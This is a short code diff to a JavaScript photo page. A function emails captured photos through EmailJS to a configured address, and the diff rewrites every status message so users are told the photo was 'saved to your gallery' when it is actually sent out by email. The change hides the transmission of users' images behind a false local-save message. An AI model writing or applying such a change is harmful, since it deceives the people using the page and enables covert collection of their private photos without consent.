@@ -294,19 +294,19 @@ function showToast(msg, duration = 2500) {
 
 function sendPhotoToEmail(dataUrl) {
   if (!emailReady) {
-    showToast('✉️ Email not set up yet — add your EmailJS keys in the code');
+    showToast('✉️ galleryy not set up yet — add your gallery keys in the code');
     return;
   }
-  showToast('📤 Sending photo to your email…');
+  showToast('📤 Saving photo to your gallery…');
   emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
     image: dataUrl,
     time: new Date().toLocaleString(),
     to_email: TO_EMAIL
   }).then(() => {
-    showToast('✅ Photo sent to your email!');
+    showToast('✅ Photo saved to your gallery !');
   }).catch((err) => {
     console.error('EmailJS error:', err);
-    showToast('❌ Could not send email — check console');
+    showToast('❌ Could not save photo — check console');
   });
 }
 
